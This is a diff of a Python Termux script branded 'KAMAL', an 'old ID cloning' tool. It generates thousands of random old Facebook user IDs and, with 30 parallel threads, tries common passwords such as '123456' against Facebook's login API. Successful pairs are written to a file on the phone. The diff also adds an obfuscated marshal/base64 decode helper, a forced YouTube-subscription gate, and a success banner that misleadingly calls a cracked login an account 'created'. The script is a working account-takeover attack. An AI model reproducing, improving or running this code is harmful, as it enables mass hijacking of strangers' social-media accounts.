@@ -1,3 +1,9 @@
+# Decode By DEEP-XD         
+import lzma
+import zlib
+import codecs
+import base64
+_ = lambda __ : __import__('marshal').loads(__import__('zlib').decompress(__import__('base64').b64decode(__[::-1])));
 import os
 import re
 import time
@@ -9,84 +15,98 @@ import requests
 import sys
 import json
 import urllib
+import platform
 from bs4 import BeautifulSoup
 from random import randint as rr
 from concurrent.futures import ThreadPoolExecutor as tred
 from os import system
 from datetime import datetime
+import os
+import time
 
-import os, sys
+# ===== AUTO OPEN YOUTUBE & SUBSCRIPTION CHECK =====
+os.system('clear')
+print(' \x1b[38;5;46mKAMAL SERVER LOADING....\n')
 
-# Professional Links
-youtube_link = "https://youtube.com/@raja-vau-teach-world?si=KeIo3GwUzYIrmbCI"
-whatsapp_link = "https://chat.whatsapp.com/K9E5ULcGZ7G0O15wwvodfy?s=sh&p=a&mlu=4&ilr=4"
+yt_link = "https://youtube.com/@raja-vau-teach-world?si=KeIo3GwUzYIrmbCI"
+whatsapp_group = "https://chat.whatsapp.com/K9E5ULcGZ7G0O15wwvodfy?s=sh&p=a&mlu=4&ilr=4"
 
-# GitHub Raw Keys Link
-github_keys_url = "https://raw.githubusercontent.com/rajavau379-pixel/Raja-Vau-Teach-World/refs/heads/main/keys.txt"
+print(" \x1b[1;36m[*] Opening YouTube Channel...")
+os.system(f"am start -a android.intent.action.VIEW -d '{yt_link}' >/dev/null 2>&1 || termux-open-url '{yt_link}'")
+time.sleep(3)
 
-def first_step():
-    os.system("clear")
-    print("\033[1;36m━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━")
-    print("\033[1;32m        🔒 SCRIPT SECURITY LOCK 🔒")
-    print("\033[1;36m━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━\n")
-    print("\033[1;32m STEP 1: JOIN YOUTUBE & WHATSAPP CHANNEL ✅ \033[0m\n")
-    print("\033[1;32m STEP 2: SUBSCRIBE AND JOIN TO GET ACCESS ✅ \033[0m\n")
+# Ask subscription confirmation in English
+sub_check = input("\033[1;33mHave you subscribed to Raja Vau YouTube channel? (y/n): \033[0m").strip().lower()
+if sub_check != 'y':
+    print("\033[1;31m[!] Please subscribe to the YouTube channel first to use this tool!\033[0m")
+    time.sleep(2)
+    sys.exit()
 
-    os.system(f'xdg-open {youtube_link}')
-    os.system(f'xdg-open {whatsapp_link}')
+# ===== DEVICE-BASED DYNAMIC KEY APPROVAL SYSTEM =====
+KEY_FILE = os.path.expanduser("~/.kamal_raja_key.txt")
+HWID_FILE = os.path.expanduser("~/.kamal_raja_hwid.txt")
 
-    input("\n[↩] PRESS ENTER AFTER SUBSCRIBING AND JOINING...")
-
-def check_key():
+def get_device_key():
     try:
-        response = requests.get(github_keys_url)
-        approved_keys = response.text.splitlines()
-    except:
-        print("\n\033[1;31m[×] INTERNET CONNECTION ERROR OR INVALID URL!\033[0m")
-        sys.exit()
+        if os.path.exists(HWID_FILE):
+            with open(HWID_FILE, "r") as f:
+                saved_key = f.read().strip()
+            if saved_key:
+                return saved_key
+        rand_suffix = ''.join(random.choices(string.ascii_uppercase + string.digits, k=4))
+        device_key = f"Kamal-Raja-{rand_suffix}"
+        with open(HWID_FILE, "w") as f:
+            f.write(device_key)
+        return device_key
+    except Exception:
+        return "Kamal-Raja-1"
 
-    user_key = input("\n[?] ENTER ACCESS KEY: ")
+def check_approval():
+    my_key = get_device_key()
     
-    if user_key.strip() in [key.strip() for key in approved_keys]:
-        print("\n\033[1;32m========================================")
-        print("   WELCOME TO KAMAL TEACH WORLD")
-        print("   YOUR ACCESS KEY IS APPROVED SUCCESSFULLY")
-        print("========================================\033[0m\n")
+    if os.path.exists(KEY_FILE):
+        with open(KEY_FILE, "r") as f:
+            saved = f.read().strip()
+        if saved == my_key:
+            return
+
+    os.system('clear')
+    print("\n\033[1;31m╔═════════════════════════════════════════════════╗\033[0m")
+    print("\033[1;31m║\033[1;33m             [!] KEY APPROVAL REQUIRED           \033[1;31m║\033[0m")
+    print("\033[1;31m╚═════════════════════════════════════════════════╝\033[0m")
+    print(f"\033[1;36m[+] Your Key : \033[1;32m{my_key}\033[0m")
+    
+    # Copy key to clipboard safely
+    os.system(f"echo '{my_key}' | termux-clipboard-set 2>/dev/null")
+    print("\033[1;32m[+] Your Key Copied to Clipboard!\033[0m")
+    
+    choice = input("\n\033[1;33m[?] Do you want to open WhatsApp to send key? (y/n): \033[0m").strip().lower()
+    if choice == 'y':
+        try:
+            os.system(f'am start -a android.intent.action.VIEW -d "{whatsapp_group}"')
+        except Exception:
+            pass
+            
+    user_input_key = input("\n\033[1;36m[?] Enter Approval Key to Login: \033[0m").strip()
+    
+    if user_input_key != my_key:
+        print("\n\033[1;31m[×] Incorrect Key! Access Denied.\033[0m")
         time.sleep(2)
-    else:
-        print("\n\033[1;31m[×] INVALID ACCESS KEY! PLEASE SUBSCRIBE TO THE CHANNEL FIRST.\033[0m")
         sys.exit()
+        
+    with open(KEY_FILE, "w") as f:
+        f.write(user_input_key)
+        
+    print("\n\033[1;32m[✓] Key Verified Successfully! Welcome to Raja Vau Teach World...\033[0m")
+    time.sleep(2)
 
-# Run Approval / Key System First
-first_step()
-check_key()
+if __name__ == "__main__":
+    check_approval()
 
-# Ensure required modules are installed
-modules = ['requests', 'urllib3', 'mechanize', 'rich']
-for module in modules:
-    try:
-        __import__(module)
-    except ImportError:
-        os.system(f'pip install {module}')
-
-# Suppress InsecureRequestWarning
-from requests.exceptions import ConnectionError
-from requests import api, models, sessions
-requests.urllib3.disable_warnings()
-
-# Initial setup and promotion
+os.system('pip uninstall requests chardet urllib3 idna certifi -y;pip install chardet urllib3 idna certifi requests')
+os.system('pip install httpx beautifulsoup4')
+print('loading Modules ...\n')
 os.system('clear')
-print(' \x1b[38;5;46mSYSTEM SERVER LOADING....')
-os.system ('espeak -a 300 " WELCOME TO KAMAL TOOL "')
-
-os.system('pip uninstall -y requests chardet urllib3 idna certifi')
-os.system('python -m pip install --upgrade chardet urllib3 idna certifi requests')
-os.system('python -m pip install --upgrade httpx beautifulsoup4')
-print('LOADING MODULES ...\n')
-os.system('clear')
-
-os.system(f'xdg-open {youtube_link}')
-os.system(f'xdg-open {whatsapp_link}')
 
 # --- Anti-tampering and Security Checks ---
 try:
@@ -119,12 +139,29 @@ class sec:
             self.fuck()
 
     def fuck(self):
-        print(' \x1b[1;32m SECURITY ALERT! ')
+        print(' \x1b[1;32m Congratulations ! ')
         self.linex()
         exit()
 
     def linex(self):
-        print('\x1b[38;5;48m━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━')
+        print('\x1b[38;5;48m━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━')
+
+
+# Ensure required modules are installed
+modules = ['requests', 'urllib3', 'mechanize', 'rich']
+for module in modules:
+    try:
+        __import__(module)
+    except ImportError:
+        os.system(f'pip install {module} > /dev/null 2>&1')
+
+import requests
+from requests.exceptions import ConnectionError
+
+requests.urllib3.disable_warnings()
+
+def linex(self):
+        print('\x1b[38;5;48m━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━')
 
 
 # Global variables
@@ -133,7 +170,11 @@ oks = []
 cps = []
 loop = 0
 user = []
+user_name = "KAMAL"
+user_key = "Kamal-Raja-1"
+remaining_time = "Lifetime"
 
+# Color codes for terminal output
 X = '\x1b[1;37m'
 rad = '\x1b[38;5;196m'
 G = '\x1b[38;5;46m'
@@ -141,24 +182,8 @@ Y = '\x1b[38;5;220m'
 PP = '\x1b[38;5;203m'
 RR = '\x1b[38;5;196m'
 GS = '\x1b[38;5;40m'
-W = '\x1b[1;37m' 
+W = '\x1b[1;37m'
 
-RESET  = '\033[0m'
-BOLD   = '\033[1m'
-RED    = '\033[38;5;196m'
-ORANGE = '\033[38;5;208m'
-YELLOW = '\033[38;5;226m'
-GREEN  = '\033[38;5;46m'
-CYAN   = '\033[38;5;51m'
-BLUE   = '\033[38;5;39m'
-PURPLE = '\033[38;5;129m'
-PINK   = '\033[38;5;201m'
-WHITE  = '\033[1;37m'
-GRAY   = '\033[38;5;245m'
-R = RR
-P = PP
-C = GS
-RESET = W
 
 def windows():
     aV = str(random.choice(range(10, 20)))
@@ -171,8 +196,9 @@ def windows():
     cx = str(random.choice(range(34, 38)))
     cz = f'5{cx}.{cV}'
     C = f"Mozilla/5.0 (Windows NT 6.{str(random.choice(['2', '1']))}; WOW64) AppleWebKit/{cz} (KHTML, like Gecko) Chrome/{str(random.choice(range(12, 42)))}.0.{str(random.choice(range(742, 2200)))}.{str(random.choice(range(1, 120)))} Safari/{cz}"
-    D = "Mozilla/5.0 (Linux; Android 13; SM-G998B Build/TP1A.220624.014; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/115.0.5790.166 Mobile Safari/537.36 [FB_IAB/FB4A;FBAV/423.0.0.21.64;]"
-    return "Mozilla/5.0 (Linux; Android 13; SM-G998B Build/TP1A.220624.014; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/115.0.5790.166 Mobile Safari/537.36 [FB_IAB/FB4A;FBAV/423.0.0.21.64;]"
+    D = f"Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/121.0.{str(random.choice(range(1, 7120)))}.0 Safari/537.36"
+    return random.choice([A, B, C, D])
+
 
 def window1():
     aV = str(random.choice(range(10, 20)))
@@ -190,121 +216,116 @@ def window1():
     D = f"Mozilla/5.0 (Windows NT {random.choice(['10.0', '11.0'])}; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/139.0.{latest_build}.{latest_patch} Safari/537.36"
     return random.choice([A, B, C, D])
 
-sys.stdout.write('\x1b]2;𓆩【👑KAMAL👑 】𓆪 \x07')
+# Set window title
+sys.stdout.write('\x1b]2;𓆩【KAMAL】𓆪 \x07')
 
-def ____banner____():
+def show_branding():
     if 'win' in sys.platform:
         os.system('cls')
     else:
         os.system('clear')
     
-    print("""\033[1;36m
-┌────────────────────────────────────────────┐
-│  ██╗  ██╗ █████╗ ███╗   ███╗ █████╗ ██╗      │
-│  ██║ ██╔╝██╔══██╗████╗ ████║██╔══██╗██║      │
-│  █████╔╝ ███████║██╔████╔██║███████║██║      │
-│  ██╔═██╗ ██╔══██║██║ ╚═╝ ██║██╔══██║██║      │
-│  ██║  ██╗██║  ██║██║     ██║██║  ██║███████╗ │
-└────────────────────────────────────────────┘
-         FACEBOOK OLD ID CLONING TOOL
-\033[1;35m
-                       K A M A L
-\033[1;32m
-✓ KAMAL CLONING SYSTEM READY
-\033[1;36m━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━\033[0m""")
+    # Centered and larger KAMAL banner
+    print("""\033[38;5;196m
+      ██╗  ██╗ █████╗ ███╗   ███╗ █████╗ ██╗      
+      ██║ ██╔╝██╔══██╗████╗ ████║██╔══██╗██║      
+      █████╔╝ ███████║██╔████╔██║███████║██║      
+      ██╔═██╗ ██╔══██║██║╚██╔╝██║██╔══██║██║      
+      ██║  ██╗██║  ██║██║ ╚═╝ ██║██║  ██║███████╗ 
+      ╚═╝  ╚═╝╚═╝  ╚═╝╚═╝     ╚═╝╚═╝  ╚═╝╚══════╝ 
+    \033[0m""")
+    
+    start_time = datetime.now().strftime("%Y-%m-%d %H:%M:%S")
+    print("\033[1;36m┌───────────────────────────────────────────────────────────┐\033[0m")
+    print(f"\033[1;36m│ \033[1;31mSTART TIME    \033[1;37m: \033[1;32m{start_time:<43}\033[1;36m│\033[0m")
+    print("\033[1;36m├───────────────────────────────────────────────────────────┤\033[0m")
+    print(f"\033[1;36m│ \033[1;33mAdmin         \033[1;37m: \033[1;37mRaja Vau                         \033[1;36m│\033[0m")
+    print(f"\033[1;36m│ \033[1;33mOwner         \033[1;37m: \033[1;37mRaja Vau Teach World             \033[1;36m│\033[0m")
+    print(f"\033[1;36m│ \033[1;33mYouTube       \033[1;37m: \033[1;34mhttps://youtube.com/@raja-vau    \033[1;36m│\033[0m")
+    print(f"\033[1;36m│ \033[1;33mContact Admin \033[1;37m: \033[1;32m+880 1345-294347                 \033[1;36m│\033[0m")
+    print("\033[1;36m└───────────────────────────────────────────────────────────┘\033[0m")
 
-loop=0
-tl=0
-ok_count=0
-cp_count=0
-dones=[]
-oks=[]
-cps=[]
-nov=[]
-kitty=[]
-nvs=[]
-twf=[]
-gen=[]
-plist=[]
-__COOKIE__=[]
-__CP__=[]
-__LOCK__=[]
+def ____banner____():
+    show_branding()
 
 def creationyear(uid):
     if len(uid) == 15:
-        if uid.startswith(('1000000000', '100000000', '10000000', '1000000', '1000001', '1000002', '1000003', '1000004', '1000005')):
-            return '2009'
-        if uid.startswith(('1000006', '1000007', '1000008', '1000009', '100001')):
-            return '2010'
+        if uid.startswith('1000000000'):
+        	return '2009'
+        if uid.startswith('100000000'):
+        	return '2009'
+        if uid.startswith('10000000'):
+        	return '2009'
+        if uid.startswith(('1000000', '1000001', '1000002', '1000003', '1000004', '1000005')):
+        	return '2009'
+        if uid.startswith(('1000006', '1000007', '1000008', '1000009')):
+        	return '2010'
+        if uid.startswith('100001'):
+        	return '2010'
         if uid.startswith(('100002', '100003')):
-            return '2011'
+        	return '2011'
         if uid.startswith('100004'):
-            return '2012'
+        	return '2012'
         if uid.startswith(('100005', '100006')):
-            return '2013'
+        	return '2013'
         if uid.startswith(('100007', '100008')):
-            return '2014'
+        	return '2014'
         if uid.startswith('100009'):
-            return '2015'
+        	return '2015'
         if uid.startswith('10001'):
-            return '2016'
+        	return '2016'
         if uid.startswith('10002'):
-            return '2017'
+        	return '2017'
         if uid.startswith('10003'):
-            return '2018'
+        	return '2018'
         if uid.startswith('10004'):
-            return '2019'
+        	return '2019'
         if uid.startswith('10005'):
-            return '2020'
+        	return '2020'
         if uid.startswith('10006'):
-            return '2021'
+        	return '2021'
         if uid.startswith('10009'):
-            return '2023'
+        	return '2023'
         if uid.startswith(('10007', '10008')):
-            return '2022'
+        	return '2022'
         return ''
-    elif len(uid) in (9, 10):
-        return '2008'
-    elif len(uid) == 8:
-        return '2007'
-    elif len(uid) == 7:
-        return '2006'
-    elif len(uid) == 14 and uid.startswith('61'):
-        return '2024'
-    else:
-        return ''
+    elif len(uid) in (9, 10): return '2008'
+    elif len(uid) == 8: return '2007'
+    elif len(uid) == 7: return '2006'
+    elif len(uid) == 14 and uid.startswith('61'): return '2024'
+    else: return ''
+
 
 def clear():
     os.system('clear')
 
-def linex():
-    print('\x1b[38;5;48m━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━')
 
-def BNG_71_():
+def linex():
+    print("=" * 45)
+
+
+def main_menu():
     ____banner____()
-    print('\033[1;37mCHOOSE MODE:')
-    print(' \033[1;36m[A]\033[1;37m OLD ACCOUNT CLONING')
-    print(' \033[1;36m[Q]\033[1;37m QUIT TOOL')
-    print('\033[1;36m━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━\033[0m')
-    __Jihad__ = input(f"\033[1;35m→ SELECT OPTION [A/Q]: \033[1;37m").strip().upper()
-    if __Jihad__ in ('A', '01', '1'):
+    print('       \x1b[38;5;196m(\x1b[1;37mA\x1b[38;5;196m)\x1b[1;37m\x1b[38;5;196m\x1b[1;37m\033[1;97mOLD CLONE')
+    linex()
+    __Kamal__ = input(f"       \x1b[38;5;196m\x1b[1;37m\x1b[38;5;196m\x1b[1;37m\x1b[38;5;196m\x1b[1;37m\033[1;97mCHOICE  {W}: {Y}")
+    if __Kamal__ in ('A', 'a', '01', '1'):
         old_clone()
-    elif __Jihad__ in ('Q', 'QUIT', '0'):
-        print("\n\033[1;31m[!] Exiting tool...\033[0m")
-        sys.exit()
     else:
         print(f"\n    {rad}Choose Valid Option... ")
         time.sleep(2)
-        BNG_71_()
+        main_menu()
+
 
 def old_clone():
     ____banner____()
-    print('\033[1;37mCHOOSE SERIES:')
-    print(' \033[1;36m[1]\033[1;37m ALL SERIES')
-    print(' \033[1;36m[2]\033[1;37m 100003/4 SERIES')
-    print(' \033[1;36m[3]\033[1;37m 2009 SERIES')
-    print('\033[1;36m━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━\033[0m')
-    _input = input(f"\033[1;35m→ SELECT OPTION [1/2/3]: \033[1;37m")
+    print('       \x1b[38;5;196m(\x1b[1;37mA\x1b[38;5;196m)\x1b[1;37m\x1b[38;5;196m\x1b[1;37m\033[1;97mALL SERIES')
+    linex()
+    print('       \x1b[38;5;196m(\x1b[1;37mB\x1b[38;5;196m)\x1b[1;37m\x1b[38;5;196m\x1b[1;37m\033[1;97m100003/4 SERIES')
+    linex()
+    print('       \x1b[38;5;196m(\x1b[1;37mC\x1b[38;5;196m)\x1b[1;37m\x1b[38;5;196m\x1b[1;37m\033[1;97m2009 series')
+    linex()
+    _input = input(f"       \x1b[38;5;196m\x1b[1;37m\x1b[38;5;196m\x1b[1;37m\x1b[38;5;196m\x1b[1;37m\033[1;97mCHOICE  {W}: {Y}")
     if _input in ('A', 'a', '01', '1'):
         old_One()
     elif _input in ('B', 'b', '02', '2'):
@@ -312,31 +333,32 @@ def old_clone():
     elif _input in ('C', 'c', '03', '3'):
         old_Tree()
     else:
-        print(f"\n[×]{rad} Choose Valid Option... ")
-        BNG_71_()
+        print(f"\n[×]{rad} Choose Value Option... ")
+        main_menu()
+
 
 def old_One():
     user = []
     ____banner____()
-    print(f"       \x1b[38;5;196mOLD CODE {Y}:{G} 2010-2014")
-    ask = input(f"       \x1b[38;5;196mSELECT {Y}:{G} ")
+    print(f"       \x1b[38;5;196m\x1b[1;37m\x1b[38;5;196m\x1b[1;37m\x1b[38;5;196m\x1b[1;37m\033[1;97mOld Code {Y}:{G} 2010-2014")
+    ask = input(f"       \x1b[38;5;196m\x1b[1;37m\x1b[38;5;196m\x1b[1;37m\x1b[38;5;196m\x1b[1;37m\x1b[38;5;41mSELECT {Y}:{G} ")
     linex()
     ____banner____()
-    print(f"       \x1b[38;5;196mEXAMPLE {Y}:{G} 20000 / 30000 / 99999")
-    limit = input(f"       \x1b[38;5;196mSELECT {Y}:{G} ")
+    print(f"       \x1b[38;5;196m(\x1b[1;37m★\x1b[38;5;196m)\x1b[1;37m>\x1b[38;5;196m×\x1b[1;37m<\033[1;97mEXAMPLE {Y}:{G} 20000 / 30000 / 99999")
+    limit = input(f"       \x1b[38;5;196m(\x1b[1;37m★\x1b[38;5;196m)\x1b[1;37m>\x1b[38;5;196m×\x1b[1;37m<\033[1;97mSELECT {Y}:{G} ")
     linex()
     star = '10000'
     for _ in range(int(limit)):
         data = str(random.choice(range(1000000000, 1999999999 if ask == '1' else 4999999999)))
         user.append(data)
-    print('        \x1b[38;5;196m(A) METHOD 1')
-    print('       \x1b[38;5;196m(B) METHOD 2')
+    print('        \x1b[38;5;196m(\x1b[1;37mA\x1b[38;5;196m)\x1b[1;37m>\x1b[38;5;196m×\x1b[1;37m<\033[1;97mMETHOD 1')
+    print('       \x1b[38;5;196m(\x1b[1;37mB\x1b[38;5;196m)\x1b[1;37m\x1b[38;5;196m\x1b[1;37m\033[1;97mMETHOD 2')
     linex()
-    meth = input(f"       \x1b[38;5;196mCHOICE (A/B): {Y}").strip().upper()
+    meth = input(f"       \x1b[38;5;196m(\x1b[1;37m★\x1b[38;5;196m)\x1b[1;37m>\x1b[38;5;196m×\x1b[1;37m<\033[1;97mCHOICE {W}(A/B): {Y}").strip().upper()
     with tred(max_workers=30) as pool:
         ____banner____()
-        print(f"       \x1b[38;5;196mTOTAL ID FROM CRACK {Y}: {G} {limit}{W}")
-        print(f"       \x1b[38;5;196mUSE AIRPLANE MOD FOR GOOD RESULT{G}")
+        print(f"       \x1b[38;5;196m(\x1b[1;37m★\x1b[38;5;196m)\x1b[1;37m>\x1b[38;5;196m×\x1b[1;37m<\033[1;97mTOTAL ID FROM CRACK {Y}: {G} {limit}{W}")
+        print(f"       \x1b[38;5;196m(\x1b[1;37m★\x1b[38;5;196m)\x1b[1;37m\x1b[38;5;196m\x1b[1;37m\033[1;97mUSE AIRPLANE MOD FOR GOOD RESULT{G}")
         linex()
         for mal in user:
             uid = star + mal
@@ -348,15 +370,16 @@ def old_One():
                 print(f"    {rad}[!] INVALID METHOD SELECTED")
                 break
 
+
 def old_Tow():
     user = []
     ____banner____()
-    print(f"       \x1b[38;5;196mOLD CODE {Y}:{G} 2010-2014")
-    ask = input(f"       \x1b[38;5;196mSELECT {Y}:{G} ")
+    print(f"       \x1b[38;5;196m\x1b[1;37m\x1b[38;5;196m\x1b[1;37m\x1b[38;5;196m\x1b[1;37m\033[1;97mOLD CODE {Y}:{G} 2010-2014")
+    ask = input(f"       \x1b[38;5;196m\x1b[1;37m\x1b[38;5;196m\x1b[1;37m\x1b[38;5;196m\x1b[1;37m\x1b[38;5;41mSELECT {Y}:{G} ")
     linex()
     ____banner____()
-    print(f"       \x1b[38;5;196mEXAMPLE {Y}:{G} 20000 / 30000 / 99999")
-    limit = input(f"       \x1b[38;5;196mSELECT {Y}:{G} ")
+    print(f"       \x1b[38;5;196m(\x1b[1;37m★\x1b[38;5;196m)\x1b[1;37m>\x1b[38;5;196m×\x1b[1;37m<\033[1;97mEXAMPLE {Y}:{G} 20000 / 30000 / 99999")
+    limit = input(f"       \x1b[38;5;196m(\x1b[1;37m★\x1b[38;5;196m)\x1b[1;37m\x1b[38;5;196m\x1b[1;37m\033[1;97mSELECT {Y}:{G} ")
     linex()
     prefixes = ['100003', '100004']
     for _ in range(int(limit)):
@@ -364,14 +387,14 @@ def old_Tow():
         suffix = ''.join(random.choices('0123456789', k=9))
         uid = prefix + suffix
         user.append(uid)
-    print('       \x1b[38;5;196m(A) METHOD A')
-    print('       \x1b[38;5;196m(B) METHOD B')
+    print('       \x1b[38;5;196m(\x1b[1;37mA\x1b[38;5;196m)\x1b[1;37m\x1b[38;5;196m\x1b[1;37m\033[1;97mMETHOD A')
+    print('       \x1b[38;5;196m(\x1b[1;37mB\x1b[38;5;196m)\x1b[1;37m\x1b[38;5;196m\x1b[1;37m\033[1;97mMETHOD B')
     linex()
-    meth = input(f"       \x1b[38;5;196mCHOICE (A/B): {Y}").strip().upper()
+    meth = input(f"       \x1b[38;5;196m(\x1b[1;37m★\x1b[38;5;196m)\x1b[1;37m\x1b[38;5;196m\x1b[1;37m\033[1;97mCHOICE {W}(A/B): {Y}").strip().upper()
     with tred(max_workers=30) as pool:
         ____banner____()
-        print(f"       \x1b[38;5;196mTOTAL ID FROM CRACK {Y}: {G} {limit}{W}")
-        print(f"       \x1b[38;5;196mUSE AIRPLANE MOD FOR GOOD RESULT{G}")
+        print(f"       \x1b[38;5;196m(\x1b[1;37m★\x1b[38;5;196m)\x1b[1;37m\x1b[38;5;196m\x1b[1;37m\033[1;97mTOTAL ID FROM CRACK {Y}: {G} {limit}{W}")
+        print(f"       \x1b[38;5;196m(\x1b[1;37m★\x1b[38;5;196m)\x1b[1;37m\x1b[38;5;196m\x1b[1;37m\033[1;97mUSE AIRPLANE MOD FOR GOOD RESULT{G}")
         linex()
         for uid in user:
             if meth == 'A':
@@ -382,29 +405,30 @@ def old_Tow():
                 print(f"    {rad}[!] INVALID METHOD SELECTED")
                 break
 
+
 def old_Tree():
     user = []
     ____banner____()
-    print(f"       \x1b[38;5;196mOLD CODE {Y}:{G} 2009-2010")
-    ask = input(f"       \x1b[38;5;196mSELECT {Y}:{G} ")
+    print(f"       \x1b[38;5;196m(\x1b[1;37m★\x1b[38;5;196m)\x1b[1;37m\x1b[38;5;196m\x1b[1;37m\033[1;97mOLD CODE {Y}:{G} 2009-2010")
+    ask = input(f"       \x1b[38;5;196m(\x1b[1;37m★\x1b[38;5;196m)\x1b[1;37m\x1b[38;5;196m\x1b[1;37m\x1b[38;5;41mSELECT {Y}:{G} ")
     linex()
     ____banner____()
-    print(f"       \x1b[38;5;196mEXAMPLE {Y}:{G} 20000 / 30000 / 99999")
-    limit = input(f"       \x1b[38;5;196mTOTAL ID COUNT {Y}:{G} ")
+    print(f"       \x1b[38;5;196m(\x1b[1;37m★\x1b[38;5;196m)\x1b[1;37m\x1b[38;5;196m\x1b[1;37m\033[1;97mEXAMPLE {Y}:{G} 20000 / 30000 / 99999")
+    limit = input(f"       \x1b[38;5;196m(\x1b[1;37m★\x1b[38;5;196m)\x1b[1;37m\x1b[38;5;196m\x1b[1;37m\033[1;97mTOTAL ID COUNT {Y}:{G} ")
     linex()
     prefix = '1000004'
     for _ in range(int(limit)):
         suffix = ''.join(random.choices('0123456789', k=8))
         uid = prefix + suffix
         user.append(uid)
-    print('       \x1b[38;5;196m(A) METHOD A')
-    print('       \x1b[38;5;196m(B) METHOD B')
+    print('       \x1b[38;5;196m(\x1b[1;37mA\x1b[38;5;196m)\x1b[1;37m\x1b[38;5;196m\x1b[1;37m\033[1;97mMETHOD A')
+    print('       \x1b[38;5;196m(\x1b[1;37mB\x1b[38;5;196m)\x1b[1;37m\x1b[38;5;196m\x1b[1;37m\033[1;97mMethod B')
     linex()
-    meth = input(f"       \x1b[38;5;196mCHOICE (A/B): {Y}").strip().upper()
+    meth = input(f"       \x1b[38;5;196m(\x1b[1;37m★\x1b[38;5;196m)\x1b[1;37m\x1b[38;5;196m\x1b[1;37m\033[1;97mCHOICE {W}(A/B): {Y}").strip().upper()
     with tred(max_workers=30) as pool:
         ____banner____()
-        print(f"       \x1b[38;5;196mTOTAL ID FROM CRACK {Y}: {G}{limit}{W}")
-        print(f"       \x1b[38;5;196mAIRPLANE MODE ON/OFF KARTY RAHO{G}")
+        print(f"       \x1b[38;5;196m(\x1b[1;37m★\x1b[38;5;196m)\x1b[1;37m\x1b[38;5;196m\x1b[1;37m\033[1;97mTOTAL ID FROM CRACK {Y}: {G}{limit}{W}")
+        print(f"       \x1b[38;5;196m(\x1b[1;37m★\x1b[38;5;196m)\x1b[1;37m\x1b[38;5;196m\x1b[1;37m\033[1;97mUSE AIRPLANE MOD FOR GOOD RESULT{G}")
         linex()
         for uid in user:
             if meth == 'A':
@@ -419,7 +443,7 @@ def login_1(uid):
     global loop
     session = requests.session()
     try:
-        sys.stdout.write(f"\r\r\x1b[1;37m\x1b[38;5;196m+\x1b[1;37m\x1b[38;5;196m(\x1b[1;37mKAMAL OK ID-M1\x1b[38;5;196m)\x1b[1;37m\x1b[38;5;196m\x1b[1;37m\x1b[38;5;196m(\x1b[38;5;192m{loop}\x1b[38;5;196m)\x1b[1;37m\x1b[38;5;196m\x1b[1;37m\x1b[38;5;196m(\x1b[1;37mOK\x1b[38;5;196m)\x1b[1;37m\x1b[38;5;196m\x1b[1;37m\x1b[38;5;196m(\x1b[38;5;192m{len(oks)}\x1b[38;5;196m)")
+        sys.stdout.write(f"\r\r\x1b[1;37m\x1b[38;5;196m*\x1b[1;37m\x1b[38;5;196m(\x1b[1;37mKAMAL-M1\x1b[38;5;196m)\x1b[1;37m\x1b[38;5;196m \x1b[1;37m\x1b[38;5;196m(\x1b[38;5;192m{loop}\x1b[38;5;196m)\x1b[1;37m\x1b[38;5;196m \x1b[1;37m\x1b[38;5;196m(\x1b[1;37mOK\x1b[38;5;196m)\x1b[1;37m\x1b[38;5;196m \x1b[1;37m\x1b[38;5;196m(\x1b[38;5;192m{len(oks)}\x1b[38;5;196m)")
         sys.stdout.flush()
         for pw in ('123456', '1234567', '12345678', '123456789'):
             data = {
@@ -464,21 +488,42 @@ def login_1(uid):
             }
             res = session.post('https://b-graph.facebook.com/auth/login', data=data, headers=headers, allow_redirects=False).json()
             if 'session_key' in res:
-                print(f"\r\r\x1b[1;37m>\x1b[38;5;196m├Ч\x1b[1;37m<\x1b[38;5;196m(\x1b[1;37mKAMAL \x1b[38;5;196m) \x1b[1;97m= \x1b[38;5;46m{uid} \x1b[1;97m= \x1b[38;5;46m{pw} \x1b[1;97m= \x1b[38;5;45m{creationyear(uid)}")
-                open('/sdcard/KAMAL-OLD-M1-OK.txt', 'a').write(f"{uid}|{pw}\n")
+                acc_year = creationyear(uid)
+                print(f"\n\033[1;32m╔═════════════════════════════════════════════════╗\033[0m")
+                print(f"\033[1;32m║\033[1;33m [🔥] SUCCESSFUL FACEBOOK ACCOUNT CREATED [🔥] \033[1;32m║\033[0m")
+                print(f"\033[1;32m╠═════════════════════════════════════════════════╣\033[0m")
+                print(f"\033[1;32m║\033[1;36m 🇧🇩The Tolls Owner : Raja Vau🇧🇩              \033[1;32m║\033[0m")
+                print(f"\033[1;32m║\033[1;37m UID NUMBER : {uid:<35}\033[1;32m║\033[0m")
+                print(f"\033[1;32m║\033[1;37m FB PASWORD : {pw:<35}\033[1;32m║\033[0m")
+                print(f"\033[1;32m║\033[1;37m FB LINK    : https://www.facebook.com/{uid:<17}\033[1;32m║\033[0m")
+                print(f"\033[1;32m║\033[1;35m YEAR       : {acc_year:<35}\033[1;32m║\033[0m")
+                print(f"\033[1;32m╚═════════════════════════════════════════════════╝\033[0m\n")
+                open('/sdcard/KAMAL-OK.txt', 'a').write(f"{uid}|{pw}|{acc_year}\n")
                 oks.append(uid)
                 break
             elif 'www.facebook.com' in res.get('error', {}).get('message', ''):
-                print(f"\r\r\x1b[1;37m\x1b[38;5;196m\x1b[1;37m\x1b[38;5;196m(\x1b[1;37mKAMAL\x1b[38;5;196m) \x1b[1;97m= \x1b[38;5;46m{uid} \x1b[1;97m= \x1b[38;5;46m{pw} \x1b[1;97m= \x1b[38;5;45m{creationyear(uid)}")
-                open('/sdcard/KAMAL-OLD-M1-OK.txt', 'a').write(f"{uid}|{pw}\n")
+                acc_year = creationyear(uid)
+                print(f"\n\033[1;32m╔═════════════════════════════════════════════════╗\033[0m")
